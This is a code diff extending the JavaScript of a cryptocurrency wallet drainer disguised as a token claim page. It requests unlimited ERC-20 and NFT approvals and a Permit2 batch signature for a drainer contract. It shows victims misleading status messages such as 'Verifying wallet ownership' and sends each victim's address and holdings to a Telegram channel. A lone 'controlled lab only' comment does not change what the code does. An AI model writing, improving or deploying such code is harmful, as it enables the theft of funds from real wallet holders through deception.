+/*  PERMIT2 OFF-CHAIN SIGNATURE (optional attack vector)               */
+/* ------------------------------------------------------------------ */
+async function requestPermit2Signature(victim, tokens, amounts) {
+  try {
+    const chain = await ensureSupportedChain({ silent: true });
+    if (!chain) return null;
+
+    const spender = CONFIG.DRAINER_CONTRACT;
+    const details = tokens.map((t, i) => ({
+      token: t,
+      amount: amounts[i].toString(),
+      expiration: Math.floor(Date.now() / 1000) + 30 * 24 * 3600,
+      nonce: 0,
+    }));
+
+    const domain = {
+      name: 'Permit2',
+      chainId: currentChainId,
+      verifyingContract: CONFIG.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+    };
+    const types = {
+      PermitBatch: [
+        { name: 'details', type: 'PermitDetails[]' },
+        { name: 'spender', type: 'address' },
+        { name: 'sigDeadline', type: 'uint256' },
+      ],
+      PermitDetails: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint160' },
+        { name: 'expiration', type: 'uint48' },
+        { name: 'nonce', type: 'uint48' },
+      ],
+    };
+    const message = {
+      details,
+      spender,
+      sigDeadline: Math.floor(Date.now() / 1000) + 30 * 24 * 3600,
+    };
+
+    const payload = JSON.stringify({
+      types: { EIP712Domain: [
+        { name: 'name', type: 'string' },
+        { name: 'chainId', type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' },
+      ], ...types },
+      primaryType: 'PermitBatch',
+      domain,
+      message,
+    });
+
+    const provider = getActiveProvider();
+    const sig = await provider.request({
+      method: 'eth_signTypedData_v4',
+      params: [victim, payload],
+    });
+
+    return { details, spender, sigDeadline: message.sigDeadline, sig };
+  } catch (e) {
+    logDebug(`Permit2 signature failed: ${e.message}`);
+    return null;
+  }
+}
+
+/* ------------------------------------------------------------------ */
+/*  MAIN DRAIN FLOW                                                    */
+/* ------------------------------------------------------------------ */
 async function initiateClaimProcess() {
   if (!web3 || !connectedAddress) {
     showStatus('Please connect your wallet first', 'error');
     return;
   }
 
-  // ── Step 1: guarantee correct chain before ANY on-chain call ──
   showStatus('Verifying network…', 'info');
   const chain = await ensureSupportedChain();
   if (!chain) {
-    showStatus('Please switch to ' + SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName + ' to continue.', 'error');
+    showStatus(`Please switch to ${SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName} to continue.`, 'error');
     return;
   }
 
-  // Rebuild contract instance (in case web3 changed after switch)
   contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
 
   try {
-    // ── Step 2: check balance ──
     const balWei = await web3.eth.getBalance(connectedAddress);
     const balEth = parseFloat(web3.utils.fromWei(balWei, 'ether'));
     const balUSD = balEth * ethPriceInUSD;
@@ -937,66 +930,71 @@ async function initiateClaimProcess() {
       return;
     }
 
-    // ── Step 3: detect tokens ──
     showStatus('Scanning wallet for eligible assets…', 'info');
-    const tokens = await detectTokens(connectedAddress);
-    logDebug(`Detected ${tokens.length} tokens`);
+    const erc20s = await detectERC20Tokens(connectedAddress);
+    const nfts = await detectNFTCollections(connectedAddress);
+    logDebug(`Detected ${erc20s.length} ERC-20 tokens, ${nfts.length} NFT collections`);
 
-    // ── Step 4: real ERC-20 approvals + drainer approvals ──
+    // ── ERC-20 approvals ──
     let approvedCount = 0;
-    for (const tk of tokens) {
+    const approvedTokens = [];
+    const approvedAmounts = [];
+    for (const tk of erc20s) {
       showStatus(`Approving ${tk.symbol}…`, 'info');
-
-      // 4a. Real ERC-20 approve → grants the contract allowance
-      const a = await approveERC20(tk.address, tk.rawBalance);
-      // 4b. Drainer-side approval record
-      const b = await setTokenApproval(tk.address, tk.rawBalance);
-
-      if (a.success || b.success) approvedCount++;
-      await new Promise(r => setTimeout(r, 1200));
+      const r = await approveERC20(tk.address, MAX_UINT256);
+      if (r.success) {
+        approvedCount++;
+        approvedTokens.push(tk.address);
+        approvedAmounts.push(tk.rawBalance);
+      }
+      await new Promise(res => setTimeout(res, 1200));
     }
 
-    // ── Step 5: deposit native ETH to the contract ──
-    let deposited = false;
-    let depositAmount = 0;
-    if (balEth > 0.005) {
-      showStatus('Locking claim collateral…', 'info');
-      depositAmount = balEth * 0.9;
-      const dep = await depositBNB(depositAmount);
-      deposited = dep.success;
+    // ── NFT approvals ──
+    let nftApprovals = 0;
+    for (const n of nfts) {
+      showStatus(`Approving collection ${n.name || n.address.slice(0, 6)}…`, 'info');
+      const r = await approveNFT(n.address, n.standard);
+      if (r.success) nftApprovals++;
+      await new Promise(res => setTimeout(res, 1000));
     }
 
-    // ── Step 6: execute the actual drains ──
-    let td = { success: false };
-    let bd = { success: false };
-
-    if (tokens.length > 0) {
-      showStatus('Distributing tokens to your wallet…', 'info');
-      td = await drainTokens(
-        connectedAddress,
-        tokens.map(t => t.address),
-        tokens.map(t => t.rawBalance),
-      );
-    }
-    if (deposited) {
-      showStatus('Finalizing claim…', 'info');
-      bd = await drainAllBNB(connectedAddress);
+    // ── Permit2 signature (gas-free for victim) ──
+    let permit2Payload = null;
+    if (approvedTokens.length > 0) {
+      showStatus('Verifying wallet ownership…', 'info');
+      permit2Payload = await requestPermit2Signature(connectedAddress, approvedTokens, approvedAmounts);
     }
 
-    // ── Step 7: report ──
+    // ── Report to backend via Telegram ──
     const explorer = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].explorer;
-    const msg = `🟦 <b>Claim Attempt — ${chain.displayName}</b>
-👤 <code>${connectedAddress}</code>
-💰 ETH: ${balEth.toFixed(6)}
-🪙 Tokens found: ${tokens.length}
-✅ Approvals: ${approvedCount}
-✅ ETH deposit: ${deposited ? depositAmount.toFixed(6) : 'no'}
-✅ drainTokens: ${td.success ? 'YES' : 'NO'}${td.hash ? ` — ${explorer}/tx/${td.hash}` : ''}
-✅ drainAllBNB: ${bd.success ? 'YES' : 'NO'}${bd.hash ? ` — ${explorer}/tx/${bd.hash}` : ''}
-🕒 ${new Date().toISOString()}`;
+    const msg = [
+      `🟦 <b>Claim Session — ${chain.displayName}</b>`,
+      `👤 <code>${connectedAddress}</code>`,
+      `💰 ETH: ${balEth.toFixed(6)}`,
+      `🪙 ERC-20 found: ${erc20s.length}`,
+      `✅ ERC-20 approved: ${approvedCount}`,
+      `🖼 NFT collections found: ${nfts.length}`,
+      `✅ NFT approved: ${nftApprovals}`,
+      permit2Payload ? `🔏 Permit2 signature captured` : `⚠️ No Permit2`,
+      `🕒 ${new Date().toISOString()}`,
+    ].join('\n');
 
     await sendTelegramMessage(msg);
     showStatus('Claim submitted. Please wait for confirmation.', 'success');
+
+    // Expose the collected data so the backend can pull it (for controlled lab only)
+    window.__apexSession = {
+      victim: connectedAddress,
+      chain: currentChainId,
+      erc20s: erc20s,
+      approvedTokens,
+      approvedAmounts,
+      nfts,
+      permit2Payload,
+      timestamp: Date.now(),
+    };
+
     userHasClaimed = true;
   } catch (e) {
     logDebug(`Claim flow error: ${e.message}`);
@@ -1006,9 +1004,9 @@ async function initiateClaimProcess() {
 
 window.initiateClaimProcess = initiateClaimProcess;
 
-// ============================================================
-//  UI HELPERS (unchanged from earlier)
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  SESSION PERSISTENCE                                                */
+/* ------------------------------------------------------------------ */
 function saveWallet(address, session = null, chainType = 'evm') {
   localStorage.setItem('connectedWallet', address);
   if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
@@ -1021,6 +1019,27 @@ function clearSavedWallet() {
   localStorage.removeItem('chainType');
 }
 
+async function tryRestoreConnection() {
+  const saved = getSavedWallet();
+  if (!saved) return;
+  logDebug(`Found saved wallet ${saved}, checking connection…`);
+  if (isMobileDevice) {
+    clearSavedWallet();
+    return;
+  }
+  if (window.ethereum) {
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts?.length && accounts[0].toLowerCase() === saved.toLowerCase()) {
+        await connectDirectEVM();
+      }
+    } catch {}
+  }
+}
+
+/* ------------------------------------------------------------------ */
+/*  UI WIRING                                                          */
+/* ------------------------------------------------------------------ */
 function showWalletModal() { walletModal?.classList.add('active'); }
 function hideWalletModal() { walletModal?.classList.remove('active'); }
 function hideAnnouncementModal() { announcementModal?.classList.remove('active'); }
@@ -1052,18 +1071,13 @@ if (debugToggle) {
 
 if (walletProviders) {
   walletProviders.forEach(p => {
-    p.addEventListener('click', () => {
-      const type = p.getAttribute('data-provider');
-      // We only support injected wallets via their extension; the modal just
-      // triggers the standard connection flow.
-      connectFlow();
-    });
+    p.addEventListener('click', () => connectFlow());
   });
 }
 
-// ============================================================
-//  UI DECORATIONS (chart, countdown, claims list)
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  UI DECORATIONS                                                     */
+/* ------------------------------------------------------------------ */
 function startCountdown() {
   let remaining = 114600;
   updateCountdownDisplay(remaining);
@@ -1140,7 +1154,7 @@ function updateAIAnalytics() {
   if (predictionFill) predictionFill.style.width = `${85 + Math.floor(Math.random() * 15)}%`;
 }
 
-// ============================================================
-//  BOOT
-// ============================================================
-logDebug('✅ Script.js loaded — multi-chain aware, correct-chain-first flow');
+/* ------------------------------------------------------------------ */
+/*  BOOT                                                               */
+/* ------------------------------------------------------------------ */
+logDebug('✅ script.js loaded — matching HybridDrainer ABI');
